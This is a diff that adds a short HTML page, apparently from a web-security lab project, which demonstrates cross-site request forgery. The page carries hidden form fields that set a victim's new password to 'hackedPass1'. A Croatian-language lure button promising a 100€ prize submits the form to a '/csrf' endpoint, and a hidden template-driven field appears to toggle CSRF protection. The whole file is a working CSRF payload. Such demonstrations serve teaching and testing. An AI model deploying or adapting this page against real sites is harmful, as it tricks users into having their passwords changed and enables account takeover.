@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/index.css">
+    <title>Document</title>
+</head>
+<body>
+    <form action="\csrf" method="POST"  >
+        <input type="hidden" name="newPassword" value="hackedPass1">
+        <input type="hidden" name="newPassword2" value="hackedPass1">
+        <button type="submit">Osvojili ste 100€! Kliknite kako biste ih osvojili.</button>
+        <input type="text" id="disableCSRF" name="disableCSRF" value="<%=useSafeQuery2%>"hidden >
+    </form>
+</body>
+</html>
